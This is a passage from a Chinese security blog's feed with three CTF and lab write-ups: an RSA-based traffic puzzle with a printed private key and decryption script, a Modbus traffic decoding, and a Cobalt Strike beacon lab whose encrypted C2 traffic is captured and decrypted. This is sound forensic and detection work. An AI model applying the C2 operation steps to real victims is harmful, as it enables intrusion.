class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN PRIVATE KEY-----</span><br><span class=\"line\">MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC1YaMyRuhD9Pu5</span><br><span class=\"line\">w6GNhfYTQ0Vo/0OjZPKyDS3viCZIuXUsUn/vQxMJPWlCQq7rRv2c7+z8PTxeirV7</span><br><span class=\"line\">1fPT/sFxgxHbjZeFDRCvU7Pc4ZknT8rTymGWR9WB6XEi8s06gWQegxOKgq7smDJs</span><br><span class=\"line\">Qow+7OGes1Xm8HxgeDjjghzeN2dS75kswo+HF6hzZVKiJGoju/jyp2hqdjuMYySv</span><br><span class=\"line\">BHzlLoH5r1Yrdg/hEIOaua2h7s5p5ybJ+8aIqTEFz5Q/FuM4z9LE0O8ysJxo4WRV</span><br><span class=\"line\">+cbtWCD17kGIjRxHW5tTTszqrwHMISVyZq+5Ib1K7DGE3a/Ek/weYp5Fh8bX8LbH</span><br><span class=\"line\">RSwBsopXAgMBAAECggEADw3xDSm8enN5dzQpEwWE5JlnR+0z8Hpe+G9GmkR7JPsb</span><br><span class=\"line\">oheg3bt7937c3y6ItSd5wk5ZpZ/xhElQAdzCtZxF8wV1dHsekeEBOwQgABvLaeti</span><br><span class=\"line\">As0f52jD7FnzVXrAlPQLWsr3Ur5BBYsmWDz3xftESLdK0HWyZRFla2Cvw7PmhAgS</span><br><span class=\"line\">CDYvj5S0qk0h7KrNGJMfM8o+j7lE3ZKv5pTTVQ+/GUwF0q+Ujk75Zg3WMfGQQVOT</span><br><span class=\"line\">nM0kOa970Yfb7V2UHcQn9HCxHY0wc+/PK4jtn2h4htTrNBBTa4B6zTDY8sfYg0XB</span><br><span class=\"line\">+M2H57We0r7azWmdeVAM3woocqbNYMUFUB/PVR36CQKBgQDD5OxBcMepIDnWXb0c</span><br><span class=\"line\">ict5/O67VhkWUb64vA695P9luBtCKxfnhlSnPjPt3olCy5KInB02MnNJMHV4haqY</span><br><span class=\"line\">Gtxb+1GeXK3pJo837s7w7bnVAE3eP3OmYHk4aq8LMtxacd8WZ0UyUH16+4hKbrh+</span><br><span class=\"line\">JowSwZvLixWaJq0XaSIOkmO83wKBgQDtCMMjMzhiNEhNDHtc+SlVzqlXKtIp61ag</span><br><span class=\"line\">pavufiUUEKyRoG8i1GoIIPn7u2hEBF8Rm3euuWLl1SHAjWswNEUJnp2rO5sFGJBK</span><br><span class=\"line\">sgpIyxFkiSYFoXWKVd0r7k/KNPk1ShpHZhSJqEsYqmDjbTFFVxUCj3xerfZlqLQT</span><br><span class=\"line\">dzdOnoVpiQKBgQCG3RDmEL30qtIGyixK/HbQehjlcmX9HrQePKIti/1kyzZA/KgN</span><br><span class=\"line\">ZkbbiRB5QA7hpIMyd8AIsvz5s1n8apHC/CMfVEuhqg61CC3rhQaFijS49uelDawS</span><br><span class=\"line\">LDLoa1ItdIuN3P2IT/qspAtvYsI29Dkh6Gng89fNbuilYuEhz+h5fcEaowKBgBlc</span><br><span class=\"line\">aqSFgm7fcSztPPXBou6PYgb1ie76QxaFI1QtIwJ2lkAujjWHzKB6BsUsVAeTACj+</span><br><span class=\"line\">HVwQcchteWMEvoc10H0q/2umwPtWmXmkev023PGIywynLdBTR4q/wMG90TwmZZFm</span><br><span class=\"line\">FqRz4TUOZbdvo2nr20+e0ou+yTIvTrUWeFBtHZEhAoGACualPMp1+DKOnGRKqpBA</span><br><span class=\"line\">c/W/ObkBBgQsV11k+wy1AZ0SVUjY0DkEKdKAMxQ6v0+ERCrbgVOux0xGR7MF7RGY</span><br><span class=\"line\">OwuVNDyCUT/gbqkxU3aUmT9oa+kbnxHtdUsbqeziEJ9xMLWlDygVfv4ae+InKbS0</span><br><span class=\"line\">MnZAAXUNDQIu5dxYCGPlrfA=</span><br><span class=\"line\">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n<p>secret.txt：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bFBkNlE3SDF1ZjRTTkVLSDRJRTFLZzJpREZrMERCaEp3Q0JzZEkyV2h6T0dhcDA4a2RQWVFGcjZhcFN2WmlUSHZqaVgydG1VbEk5aTJ3aC8xZ2h3SUs5N1BiSERxMStTeEUxbnI0Nm0wUC9DMXpna0IyMit1M1YycTE5SU9BYXRuYXNya1BESkxQaW0reG54N3QxTnlBN1ZKTHdzUk5DUG9xRWdMbWZRQnd1elBCalhDdHVmUVkva0FpaDdLdTRPblVXa0pYRHlkSWxPTnplamVJK21RRy84VVFITTRQYnNjam9vdlJ2ZWMrYUpSMWxqODAzMXFjbSsyWnZJZFIrZElEYkNXMmtZam1OYm1XK0w2UG5LQ2Uvc3VKSjRBZVI0Sm1NbGVRRVJMemltZ1huV25GUnY4WnppVXNyS1lVVXRNb2w5V1hKazg4VjdRSE1yL0wzRkVnPT=</span><br></pre></td></tr></table></figure>\n<p>在线网站分解私钥之后使用脚本进行解密<br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5oaWVuY29kZS5jb20vcHJpdl9hc3lzLmh0bWw=\"> http://www.hiencode.com/priv_asys.html</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from base64 import *</span><br><span class=\"line\">from Crypto.Util.number import *</span><br><span class=\"line\">n = 22897280037618974619340846752999631827813818170571516093336584434775675187911179854957453351224025346333112420553633170369593452474468994360875843672122891197414738125554960475847811974999960386639323750005461211814555798539418918028176295505664790681416998283240971057298698033755526560483652785000652359544503171667435140921558876010825999934580334820605796539553023241585105667208475754931859753698830927470458071231845332752109628151991221800856650720139024371213297529175153974325381443615718839995260607889829031612063951205623842853683671813857941916059109130631113924524369318816564540461224076941697301514839</span><br><span class=\"line\">d = 1900449437182483367287250498389329650844458305061625673889624960449246764188822540260327257945635074406502662795085030291673460560215971051863590821284350316131917360177551726633415829806251194334873453746047366551189042314344098823782976935213141109778716788404859271345595128776312414754273606115797923459124942020459641900581560513546440430423068817960532088772269553080009423772016559433423351574011538603757410467222208992113233166851765907432319285253284046549512288457264075133865582854163144527301952940757041488705998905401183446222196348514190895895140391122398911374890210750891922002358312637449887414793</span><br><span class=\"line\">ksecret = b&quot;lPd6Q7H1uf4SNEKH4IE1Kg2iDFk0DBhJwCBsdI2WhzOGap08kdPYQFr6apSvZiTHvjiX2tmUlI9i2wh/1ghwIK97PbHDq1+SxE1nr46m0P/C1zgkB22+u3V2q19IOAatnasrkPDJLPim+xnx7t1NyA7VJLwsRNCPoqEgLmfQBwuzPBjXCtufQY/kAih7Ku4OnUWkJXDydIlONzejeI+mQG/8UQHM4PbscjoovRvec+aJR1lj8031qcm+2ZvIdR+dIDbCW2kYjmNbmW+L6PnKCe/suJJ4AeR4JmMleQERLzimgXnWnFRv8ZziUsrKYUUtMol9WXJk88V7QHMr/L3FEg==&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">c = bytes_to_long(b64decode(ksecret))</span><br><span class=\"line\">print(long_to_bytes(pow(c,d,n)))</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8ysy8AOcf2RsK43v.png!thumbnail\" alt=\"\"></p>\n<p>得到密码：b4ddfa11-4c91-48da-8e57-37d86a3f40ee</p>\n<p>解压压缩包得到 1.txt 文件，是个 mimikatz 爆破结果，在里面找到 username 为 flag</p>\n<p>password 便是 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vojec67wEkfyZ2AZ.png!thumbnail\" alt=\"\"></p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/Modbus%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/Modbus%E5%8D%8F%E8%AE%AE%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/",
            "title": "Modbus协议流量分析",
            "date_published": "2024-04-16T05:58:19.005Z",
            "content_html": "<p>记一次 Modbus 协议流量分析</p>\n<p>首先协议分级能够发现是 Modbus/TCP 的类型的流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/nogwwyfVtbDVq7IG.png!thumbnail\" alt=\"\"></p>\n<p>同时这也是题目中考的最多的 Modbus 协议流量</p>\n<p>常见的功能码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1：读线圈</span><br><span class=\"line\"></span><br><span class=\"line\">2：读离散输入</span><br><span class=\"line\"></span><br><span class=\"line\">3：读保持</span><br><span class=\"line\"></span><br><span class=\"line\">4：读输入</span><br><span class=\"line\"></span><br><span class=\"line\">5：写单个线圈</span><br><span class=\"line\"></span><br><span class=\"line\">6：写单个保持</span><br><span class=\"line\"></span><br><span class=\"line\">15：写多个线圈</span><br><span class=\"line\"></span><br><span class=\"line\">16：写多个保持</span><br></pre></td></tr></table></figure>\n<p>首先先过滤一下 modbus 协议的流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126151613792.png\" alt=\"\"></p>\n<p>翻了翻，发现该流量包中只有两种功能码，一个是 3（读保持）一个是 6（写单个保持）</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126152334120.png\" alt=\"\"></p>\n<p>首先先将功能码 6 且选中进行过滤，并将 data 都提取出来</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126152810732.png\" alt=\"\"></p>\n<p>转码也并没有什么发现</p>\n<p>接下来同样的方法过滤功能码 3</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20231126153115071.png\" alt=\"\"></p>\n<p>发现每次的回复包都有一组可疑的数据，并且随着包的标号往下看，从每一组的第一个数开始依次轮换了三次，也就是有四组数据，把他们都提取出来</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">71 71 81 63 79 64 43 40 41 41</span><br><span class=\"line\"></span><br><span class=\"line\">112 65 35 86 83 101 98 77 96 91</span><br><span class=\"line\"></span><br><span class=\"line\">74 93 88 71 90 85 68 73 68 85</span><br><span class=\"line\"></span><br><span class=\"line\">90 93 0 1 2 3 4 3 2 1</span><br></pre></td></tr></table></figure>\n<p>直接转 ascii 码并不正确，但是由于数据可疑并且长度差不多，我们计算一下标头数据和 flag 头字母 ascii 码的偏移量，发现都是一样的</p>\n<p>利用脚本加上偏移转换成 ascii 码得到 flag</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c =[71,71,81,63,79,64,43,40,41,41,112,65,35,86,83,101,98,77,96,91,74,93,88,71,90,85,68,73,68,85,90,93,0,1,2,3,4,3,2,1]</span><br><span class=\"line\"></span><br><span class=\"line\">offset = ord(&#x27;H&#x27;) - c[0]</span><br><span class=\"line\"></span><br><span class=\"line\">for i in range(0, len(c)):</span><br><span class=\"line\"></span><br><span class=\"line\">    print(chr(c[i]+i+offset),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>\n<p>输出：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HITCTF2023&#123;M0dbus_so_so_so_easy&#125;!#%&#x27;))))</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/CS%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/CS%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "CS流量浅析",
            "date_published": "2024-04-16T05:58:18.972Z",
            "content_html": "<h1 id=\"cs的工作流程\"><a class=\"markdownIt-Anchor\" href=\"#cs的工作流程\">#</a> cs 的工作流程</h1>\n<p>1、被控机先向 TeamServer 发送心跳包，包中包含了主机信息和协商密钥等信息，而这些信息都被使用 RSA 公钥进行了加密放在了 Cookie 中</p>\n<p>2、server 端第一次心跳之后进入睡眠，并用私钥将数据包解开获得主机信息和协商密钥，基于协商密钥会生成新的 AES<br>\nkey 和 HMAC key</p>\n<p>3、睡眠时间过后，会再一次发送心跳包询问是否有新的命令，当有新的命令出现时会将其数据包加密后发送，而命令会作为该回应包的 body 发送</p>\n<p>4、被控端在接收到数据包之后进行解密获取命令，再将命令执行的结果加密后返回给 TeamServer，该次传输使用 POST 请求发送回 TeamServer</p>\n<p>5、TeamServer 解密之后能看到明文的回显</p>\n<p>6（不同情况）、当 3 中所说的睡眠时间过了之后，再次发送心跳包却没有收到新的指令信息，这时候 teamserver 就会返回空包</p>\n<p>ps：还需要知道的是，Private Key 和 Public<br>\nKey 是特定的，并且保存在.cobaltstrike.beacon_keys 中，也就是说.cobaltstrike.beacon_keys 是特定的，对于一个固定的 CS，经过首次使用 CS 软件，就会生成一组固定的私钥和公钥，而这也是通信的关键。现在很多 CS 的私钥已经披露了，也就意味着如果抓到攻击者的 CS 流量，能够精确找到对应的私钥，那么解密流量包也是有可能的，但是前提不是魔改的 CS</p>\n<p>用一副流程图来解释下 CS 的通信流程（来自 Chris 师傅文章流程图的魔改）：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/IAq4qZHApAwrtoYW.png!thumbnail\" alt=\"\"></p>\n<h1 id=\"信标\"><a class=\"markdownIt-Anchor\" href=\"#信标\">#</a> 信标</h1>\n<p>接下来来说说信标，信标就是 cs 中的 beacon，对于 windwos 操作系统来说，就是 cs 生成需要执行的 beacon.exe 文件，同时因为信标由 teamserver 端进行生成，因此其中包含很多 teamserver 端的信息，更是可以通过静态和动态的信标去解密 cs 的通信流量，这些后文中都会提到</p>\n<h1 id=\"心跳包\"><a class=\"markdownIt-Anchor\" href=\"#心跳包\">#</a> 心跳包</h1>\n<p>接下来浅浅的解释一下心跳包的作用与含义。利用心跳包的这种方式，定时向 TeamServer 进行发包询问，无命令就返回空包，有命令加密后进行回包，有效避免了进行长时间不间断的数据传输和通信而被防御设备检测到异常流量采取措施，sleep 的时间一般是 60s。从正向来看，当 sleep 的时间默认为 60s 时，我们发送命令获得回显的时间有长有短，这就是原因，越接近睡眠时间结束发送的命令，获得的回显时间也越快，只有当心跳包发送进行询问，发现有新的指令，这个时候才会进行传输通信。这里顺便提一嘴，指令是指 TeamServer 端发送的任意动作指令，不是单单指命令行的操作指令</p>\n<p>当然，个人看来，从防守方来讲，既然知道了心跳包的的存在，一样可以通过改写规则来实现检测和拦截，一般 CS 的 sleep 时间设定在 6-9s。前段时间和某大厂做流量检测产品的大手子师傅聊了天，知道了其实做流量检测这种安全产品，主要就是想方法让它越做越精准，而不是只会存在一大堆不准确的误报，费时费力不说，客户看了也头疼。例如某一个渗透工具，它可主要分为三次通信，第一次连接，第二次测试，第三次进行执行，这时候没有必要第一次在尝试连接的时候便进行告警，很多的业务流量可能也是相似的，如果这就直接告警那会出现铺天盖地的误报。一般第一次和第二次通信都抓他们的特征包并且做好记录，当第三次出现时，再发出告警并且做一些拦截防护措施，这样既避免了误报，也实现了成功告警拦截</p>\n<h1 id=\"抓包\"><a class=\"markdownIt-Anchor\" href=\"#抓包\">#</a> 抓包</h1>\n<p>接下来抓取流量进行分析</p>\n<p>攻击机：192.168.40.144</p>\n<p>靶机：192.168.40.131</p>\n<p>首先在攻击机上开启 cs 服务，设置好监听后生成 windows 木马，将生成的 beacon.exe 放入 windows 靶机上，开始抓取流量</p>\n<h2 id=\"第一次心跳包\"><a class=\"markdownIt-Anchor\" href=\"#第一次心跳包\">#</a> 第一次心跳包</h2>\n<p>双击 beacon.exe 之后暂停进行分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/hIxnPjmgJyiGznjw.png!thumbnail\" alt=\"\"></p>\n<p>这时候我们的 TeamServer 显示靶机已经受害，被上线了</p>\n<p>按照 CS 的工作流程，在 TeamServer 显示出主机之前，需要经过：被控机子的第一次心跳包；TeamServer 接收进入睡眠，并且解密数据包获取主机信息，生成新的 AES<br>\nkey 和 HMAC key 两个大致的步骤，接下来看看流量包</p>\n<p>过滤一下 http</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/bscAdYSqGym9AHrC.png!thumbnail\" alt=\"\"></p>\n<p>可以看到一个心跳包一个回包，追踪一下看看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/WIzbHq6IgpHti5BR.png!thumbnail\" alt=\"\"></p>\n<p>可以看到 get 请求发送的第一个心跳包，cookie 记录了公钥加密后的主机信息和协商密钥，向 TeamServer 发包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UKMLncMKGZWU5gV1.png!thumbnail\" alt=\"\"></p>\n<p>可以看到 TeamServer 返回了一个空包，符合 TeamServer 第一次接收到心跳包的流程。</p>\n<p>对第一次心跳包抓包的发现做一个总结：根据前面所说，Teamserver 出现被上线机子的信息之前，需要经历第一次心跳包，而我们在此之前所拥有的行为只有点击 exe，也就是说双击 exe 的行为使我们向 TeamServer 进行了第一次的发包，并且让 TeamServer 成功解密获取到了主机信息并显示在了 TeamServer 上，成功上线</p>\n<h2 id=\"无回显指令\"><a class=\"markdownIt-Anchor\" href=\"#无回显指令\">#</a> 无回显指令</h2>\n<p>接下来分析一下第一个心跳包之后再次发送心跳包只无回显指令的情况，抓包，开始上线，将上线机子的 sleep 时间调整为 6-9s，静静等待几个睡眠时间</p>\n<p>过滤一下 http</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/OTp6bWR4hkU1togE.png!thumbnail\" alt=\"\"></p>\n<p>发现睡眠时间调整后短时间内出现了很多心跳包的发送与回包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BEM8WX0ZyPC09c9b.png!thumbnail\" alt=\"\"></p>\n<p>根据上图所示，第一个框中就是上线前接收到的第一个心跳包，解析完之后进入睡眠，第二个框是第二次心跳包，回包发现 body 中带有指令信息，这就是我们修改 sleep 时间的指令，以回包的形式加密后发送给被控端，心跳包 1 和心跳包 2 之间间隔时间很长，因为原先设定的时间为默认的 60s，所以第一个心跳包之后进入的睡眠时间为 60s，结束之后第二个心跳包使被控端接收到指令修改 sleep 为 6s 之后，接下来抓包能明显感觉到心跳包发送的速度更快了。因为接下来没有进行任何的操作，因此第三个框中的回包全是空包</p>\n<h2 id=\"同一次睡眠时间执行1指令\"><a class=\"markdownIt-Anchor\" href=\"#同一次睡眠时间执行1指令\">#</a> 同一次睡眠时间执行 &gt; 1 指令</h2>\n<p>接着分析心跳包接收到有回显命令的情况。写到这里的时候，我有一个疑问，当 sleep 时间够长（可以为默认的 60s）时，执行两个指令，那么两个指令会作为一个心跳包的回包还是两个分别作为两个心跳包的回包呢？于是就想着把修改 sleep 时间的指令和一个命令行指令在第一次睡眠时间同时执行看看会是什么效果</p>\n<p>抓包过滤 http</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/30r8yh1Lbo0I2iys.png!thumbnail\" alt=\"\"></p>\n<p>同样分三个框来分析，在抓包过程中，在第一次睡眠时间修改了 sleep 并且输入了 ls 命令。第一个框便是第一次心跳包，第二个框便是 60s 睡眠时间过后的第二个心跳包，发现被控端 POST 传回了一个包，而这个包便是加密过后的命令执行的回显，根据上面<strong>无回显指令</strong>的分析，sleep 指令被传到被控端之后被执行是没有包被发送回来的，同时在抓取的过程中发现，第二个心跳包之后的心跳包发送间隔变短，也就是说两条指令被作为一个心跳包的回包发送给了被控端解密执行，sleep 指令没有发送回包，而命令执行的回显被 POST 传回 TeamServer，疑问成功解决。那么问题又来了，如果说有两条有回显的命令同一次睡眠时间执行，会不会在同一个包中 POST 发送回来呢？继续抓包研究</p>\n<p>这次在第一次心跳包之后的睡眠时间执行了 ls 和 shell more<br>\nflag.txt 两条指令，并空了两个心跳包</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZnKaypioSb64HmWM.png!thumbnail\" alt=\"\"></p>\n<p>还是三个框来分析，第一个框为第一次心跳没问题，第三个框为空余的两次心跳包，第二个框可以确定的是心跳包的回包包含了两条指令，而我们可以明显的看到，只有一条 POST 请求包发送回 TeamServer 端，而我们的 TeamServer 端分别出现了两条命令的回显，证明两条命令被放在同一个包作为 body，被加密后 POST 发送回 TeamServer</p>\n<p>** 结论：** 在一个睡眠时间中同时执行两条指令，两条指令会在同一个心跳包询问时（也就是睡眠时间过后的下一个心跳包）被一起返回执行；同时，如果执行两条带有回显的命令，两次的回显也会被放在同一个包 POST 发回。也就是说一次心跳可以执行多条指令，并且同样可以返回多条指令的回显</p>\n<p>（PS：当然啦这是为了研究下流量所以一点点慢慢分析，如果好奇想知道能否一次心跳执行多条指令的直接 TeamServer 执行试试，看看回显和功能的改变就好）</p>\n<p>##</p>\n<h2 id=\"解密cs通信流量\"><a class=\"markdownIt-Anchor\" href=\"#解密cs通信流量\">#</a> 解密 CS 通信流量</h2>\n<h3 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一：</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NsemR1ZGUvY3Mtc2NyaXB0cw==\">https://github.com/Slzdude/cs-scripts</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1dCR2xJbC9DU19EZWNyeXB0\">https://github.com/WBGlIl/CS_Decrypt</span></p>\n<p>根据 CS 的通信流程，我们可以知道最后的通信流量是通过生成的 AES Key 和 HMAC<br>\nKey 进行加密的，也就是说需要得到这两个 key。而这两个 key 是根据 TeamServer 端接收到第一个心跳包时用私钥去解密心跳包中公钥加密的 cookie，根据解密出的协商公钥生成的。而公钥加密的 cookie 我们自然能在心跳包中看到，私钥就需要去.cobaltstrike.beacon_keys 文件中拿，使用 github 上的 cs-scripts 项目能进行提取。这就具备了解密 CS 通信流量的条件了</p>\n<p>对于上一个标题所得的后半段结论：&quot;多条回显会被同一个包发送回来&quot; 的结论，如果没有看 TeamServer 只看流量包并不能确定。因此，既然知道了解密方法，那就拿上一标题中的流量包来进行解密说明</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vb1foefxNCQYSVlP.png!thumbnail\" alt=\"\"></p>\n<p>首先先拿到私钥，并使用 CS_Decrypt 项目中的脚本利用私钥解密心跳包中的 cookie</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/EPkich9vmVFo3gFO.png!thumbnail\" alt=\"\"></p>\n<p>成功拿到被控主机信息和两个需要用到的 key</p>\n<p>接着就可以拿这两个 key 去解密通讯流量了</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QtGGFfBQeYy8jYRi.png!thumbnail\" alt=\"\"></p>\n<p>首先是第二个心跳包的回包，也就是带有 TeamServer 指令的加密回包，它的 body 中带有指令，查看它的 data 数据，根据脚本要求将其进行 16 进制转换再转换为 base64 编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MaFkCq1tZfMKz5bX.png!thumbnail\" alt=\"\"></p>\n<p>利用已知的两个 key 和加密的 base64 编码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Jh3Sp7iyGwwFz8qd.png!thumbnail\" alt=\"\"></p>\n<p>可以看到执行了 more<br>\nflag.txt 而没有看到 ls 命令，这是为什么呢？先继续往下看，看看命令执行的回显</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/yGcYelH83tiNXRip.png!thumbnail\" alt=\"\"></p>\n<p>也就是被控机子 POST 发回 TeamServer 的包的 data 数据块，同样的方法放入解密脚本中</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/QqByEDHMFR5r8BMy.png!thumbnail\" alt=\"\"></p>\n<p>但是发现也是能解密出一条命令执行的回显，这就很奇怪了，按照上面三个框的分析，第一个框为第一次心跳包，没有操作，第三个框也同样是返回空包，能返回的只有第二个框中的 POST 请求包，并且在抓取流量的时候也确切的看到 TeamServer 端回显了第二个命令执行的内容，所以只可能是脚本的问题</p>\n<h3 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二：</h3>\n<p>重新出发</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21pbmhhbmd4aWFvaHVpL0NTdGhpbmc=\">https://github.com/minhangxiaohui/CSthing</span></p>\n<p>先说说该脚本，并且简单对比一下和方法一之间使用的不同</p>\n<p>首先能看到 1768.py 该脚本是用来解密信标的，信标中包含了很多 TeamServer 端的信息，包括公钥、sleep、抖动都能从信标中解密出来，也就是说，不一定要找到本地的 key 文件，同样可以通过解密信标，使用公钥进行指纹匹配来获取私钥（1768.py 中就已有现披露的 CSkey 的库），但是如果是未披露的 CSkey，那么拿到信标依然没有作用，还是得拿到本地的 key 文件才能解密流量。这里的私钥同样用方法一当中的脚本来获取</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edP45N5pP2hM7f90.png!thumbnail\" alt=\"\"></p>\n<p>先将 key 进行 base64 解码之后再转为 16 进制</p>\n<p>使用命令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-decrypt-metadata.py -p 私钥 cookie</span><br></pre></td></tr></table></figure>\n<p>得到 Raw key、AES key 和 HMAC key</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ubm5wYy0xMzExNDQxMDQwLmNvcy5hcC1zaGFuZ2hhaS5teXFjbG91ZC5jb20vZWRQNDVONXBQMmhNN2Y5MC5wbmchdGh1bWJuYWls\">https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/edP45N5pP2hM7f90.png!thumbnail</span></p>\n<p>并解密出主机信息，和方法一之中的脚本不同的是，接下来解密通信流量可以使用原始 key 也就是 Raw<br>\nkey 进行解密</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 cs-parse-http-traffic.py -r [Raw key] 1.pcapng</span><br></pre></td></tr></table></figure>\n<p>在不规定其它参数的情况下解密出流量包中的通信流量</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/DQrt5JUsZGS9X846.png!thumbnail\" alt=\"\"></p>\n<p>在这个脚本中就很清楚能看到了，第一个框显示了数据包 318 作为第二个心跳包的回包，回了两条指令，对于 % comspec% 的解释就是</p>\n<blockquote>\n<p>不管命令行外壳是 cmd.exe 还是 command.exe，% comspec%<br>\n 会自动选择正确的一个<br>\n而数据包 328 中，同样装载了两条指令的回显，证明上面的猜测是正确的</p>\n</blockquote>\n<blockquote>\n<p>记录一个过滤规则：<br>\n引用自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLm52aXNvLmV1LzIwMjEvMTAvMjcvY29iYWx0LXN0cmlrZS11c2luZy1rbm93bi1wcml2YXRlLWtleXMtdG8tZGVjcnlwdC10cmFmZmljLXBhcnQtMi8=\">https://blog.nviso.eu/2021/10/27/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-2/</span><br>\n 由于数据已加密，我们需要提供原始密钥（选项 -r<br>\ncaeab4f452fe41182d504aa24966fbd0），并且由于数据包捕获包含除纯 Cobalt<br>\nStrike C2 流量之外的其他流量，因此最好提供显示过滤器（选项 -Y http 和<br>\n ip. addr == 192.254.79.71 并且 frame.number 